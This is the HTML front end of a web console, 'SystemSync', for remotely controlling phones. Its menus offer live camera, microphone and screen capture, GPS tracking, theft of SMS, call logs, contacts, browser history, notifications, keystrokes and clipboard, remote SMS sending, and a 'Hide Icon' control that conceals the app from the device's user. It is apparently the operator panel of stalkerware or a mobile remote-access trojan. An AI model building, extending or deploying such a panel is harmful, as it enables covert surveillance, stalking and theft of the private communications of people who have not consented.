<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync Console</title>

    <!-- Leaflet CSS (GPS map) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

    <!-- App stylesheet -->
    <link rel="stylesheet" href="css/style.css">
</head>
<body>

<div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>

<div id="screenModalOverlay" class="modal-overlay">
    <div class="mobile-popup" id="mobilePopup">
        <div class="phone-frame">
            <div class="screen-container">
                <video id="modalScreenVideo" autoplay playsinline></video>
            </div>
        </div>
        <div class="popup-controls">
            <button id="modalSnapBtn" title="Snapshot">📸</button>
            <button id="modalRecordBtn" title="Record">🔴</button>
            <button id="modalFullscreenBtn" class="fullscreen-btn" title="Fullscreen">⛶</button>
            <button id="modalCloseBtn" class="close-btn" title="Close">✕</button>
        </div>
    </div>
</div>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Device</div>
        <button onclick="getInstalledApps()"><span>📱</span> <span>Installed Apps</span></button>
        <button onclick="showActivityTimeline()"><span>📜</span> <span>Activity Timeline</span></button>
    </div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>

        <button onclick="toggleCameraPanel('click')"><span>📷</span> <span>Click Picture</span></button>
        <div id="clickCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>
                <label><input type="radio" name="clickCameraSelect" value="back"> Rear</label>
            </div>
            <div class="camera-option" id="flashOption">
                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
            </div>
            <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
            <!-- Clear button moved to image result area (next to Save) -->
        </div>

        <button onclick="toggleCameraPanel('live')"><span>📹</span> <span>See Live</span></button>
        <div id="liveCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
            </div>
            <div class="camera-option">
                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
            </div>
            <button class="live-btn" onclick="startLiveStream()">See Live</button>
        </div>

        <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
        <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn"><span>⏹</span> <span>Stop Live Audio</span></button>

        <button onclick="sendCommand('GET_LOCATION')"><span>📍</span> <span>GPS Location</span></button>
        <button onclick="toggleLiveGps()" id="liveGpsBtn"><span>🛰️</span> <span>Live GPS Track</span></button>
    </div>

    <div class="section">
        <div class="section-title">Data</div>
        <button onclick="sendCommand('LIST_FILES', { path: 'root' })"><span>📂</span> <span>File Manager</span></button>
        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> <span>SMS Inbox</span></button>
        <button onclick="sendCommand('GET_SMS', { box: 'sent' })"><span>📤</span> <span>SMS Sent</span></button>
        <button onclick="sendCommand('GET_CALL_LOGS')"><span>📞</span> <span>Call Logs</span></button>
        <button onclick="sendCommand('GET_CONTACTS')"><span>👥</span> <span>Contacts</span></button>
        <button onclick="sendCommand('GET_BROWSER_HISTORY')"><span>🌐</span> <span>Browser History</span></button>
        <button onclick="sendCommand('GET_WIFI_NETWORKS')"><span>📶</span> <span>Wi-Fi Networks</span></button>
    </div>

    <div class="section">
        <div class="section-title">Monitoring</div>
        <button onclick="showAppUsagePanel()"><span>📊</span> <span>Screen Time</span></button>
        <button onclick="sendCommand('GET_NOTIFICATIONS')"><span>🔔</span> <span>Social Messages</span></button>
        <button onclick="sendCommand('GET_KEYLOG')"><span>⌨️</span> <span>Keyboard Log</span></button>
        <button onclick="sendCommand('GET_CLIPBOARD')"><span>📋</span> <span>Clipboard</span></button>
        <button onclick="showGeofencePanel()"><span>🗺️</span> <span>Geofence</span></button>
        <button onclick="showSchedulePanel()"><span>⏱️</span> <span>Auto Capture</span></button>
    </div>

    <div class="section">
        <div class="section-title">Control</div>
        <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
        <button onclick="sendCommand('LOCK_DEVICE')"><span>🔒</span> <span>Lock Screen</span></button>
        <button onclick="showSendSmsPanel()"><span>✉️</span> <span>Send SMS</span></button>
        <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> <span>Vibrate (1s)</span></button>
    </div>

    <div id="alertsBadge" style="margin:10px 0;display:none;">
        <div style="background:#fff3e0;border:1px solid #ff9800;border-radius:8px;padding:10px;font-size:12px;">
            <strong>⚠️ Alerts</strong>
            <div id="alertsList" style="margin-top:6px;max-height:150px;overflow:auto;"></div>
            <button onclick="clearAlerts()" style="margin-top:6px;font-size:11px;padding:3px 8px;background:#ff9800;color:#fff;border:none;border-radius:4px;cursor:pointer;">Clear</button>
        </div>
    </div>
</div>

<div id="main">
    <div id="header">
        <div class="header-left">
            <button class="menu-btn" onclick="toggleSidebar()">☰</button>
            <span style="font-size:14px;font-weight:700;white-space:nowrap;">SystemSync</span>
            <div class="device-selector-container">
                <select id="deviceSelector" onchange="switchDevice(this.value)">
                    <option value="">Select Device</option>
                </select>
                <span class="device-count" id="deviceCount">0</span>
            </div>
        </div>
        <div class="header-right">
            <div id="batteryInfo">
                <div class="battery-icon">
                    <div class="battery-level" style="width: 0%"></div>
                </div>
                <span class="battery-percent">--%</span>
            </div>
            <span id="status">CONNECTING</span>
            <button class="disconnect-btn" onclick="disconnectDevice()" title="Disconnect device">✕</button>
            <button class="reconnect-btn" onclick="connectWebSocket()" title="Reconnect">⟲</button>
        </div>
    </div>
    <div id="content">
        <div id="main-panel">
            <div id="welcomeMessage">
                <div id="devicePickerScreen" style="padding:40px 20px;text-align:center;">
                    <div style="font-size:48px;margin-bottom:16px;">🔗</div>
                    <h2 style="font-size:22px;color:#1a2634;margin-bottom:8px;">SystemSync Console</h2>
                    <p style="color:#7b8a9b;margin-bottom:32px;">Connected devices will appear below. Select one to start.</p>
                    <div id="deviceGrid" style="
                        display:grid;
                        grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
                        gap:16px;
                        max-width:700px;
                        margin:0 auto 32px;
                        text-align:left;
                    "></div>
                    <p id="noDevicesHint" style="color:#aaa;font-size:13px;">
                        ⏳ Waiting for a device to connect...
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>

    <!-- External libraries -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <!-- App scripts — ORDER MATTERS -->
    <script src="js/config.js"></script>     <!-- Global constants, ICE servers, variables -->
    <script src="js/camera.js"></script>     <!-- WebRTC peer connections, camera/screen/audio -->
    <script src="js/renderers.js"></script>  <!-- SMS, call logs, file manager display -->
    <script src="js/monitoring.js"></script> <!-- Contacts, screen time, keylog, geofence, etc. -->
    <script src="js/core.js"></script>       <!-- WebSocket, commands, handleJSON, main logic -->
    <script src="js/ui.js"></script>         <!-- Window exports, init -->

</body>
</html>
